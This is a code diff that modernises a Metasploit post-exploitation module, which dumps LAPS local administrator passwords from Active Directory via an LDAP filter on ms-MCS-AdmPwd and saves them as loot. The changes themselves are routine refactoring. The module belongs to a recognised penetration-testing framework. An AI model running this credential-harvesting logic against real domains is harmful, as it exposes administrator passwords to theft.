@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'rex'
-require 'msf/core'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::LDAP
 
@@ -40,7 +37,7 @@ class Metasploit3 < Msf::Post
       OptBool.new('STORE_DB', [true, 'Store file in loot.', false]),
       OptBool.new('STORE_LOOT', [true, 'Store file in loot.', true]),
       OptString.new('FILTER', [true, 'Search filter.', '(&(objectCategory=Computer)(ms-MCS-AdmPwd=*))'])
-    ], self.class)
+    ])
 
     deregister_options('FIELDS')
   end
@@ -65,7 +62,7 @@ class Metasploit3 < Msf::Post
 
       if datastore['STORE_LOOT']
         stored_path = store_loot('laps.passwords', 'text/plain', session, results_table.to_csv)
-        print_status("Results saved to: #{stored_path}")
+        print_good("Results saved to: #{stored_path}")
       end
     end
   end
@@ -75,11 +72,11 @@ class Metasploit3 < Msf::Post
   # the database if datastore option STORE_DB is true.
   #
   # @param [Array<Array<Hash>>] the LDAP query results to parse
-  # @return [Rex::Ui::Text::Table] the table containing all the result data
+  # @return [Rex::Text::Table] the table containing all the result data
   def parse_results(results)
     laps_results = []
     # Results table holds raw string data
-    results_table = Rex::Ui::Text::Table.new(
+    results_table = Rex::Text::Table.new(
       'Header'     => 'Local Administrator Password Solution (LAPS) Results',
       'Indent'     => 1,
       'SortIndex'  => -1,
@@ -184,5 +181,4 @@ class Metasploit3 < Msf::Post
     ruby_time = Time.at(unix_time)
     ruby_time.strftime("%d/%m/%Y %H:%M:%S GMT %z")
   end
-
 end
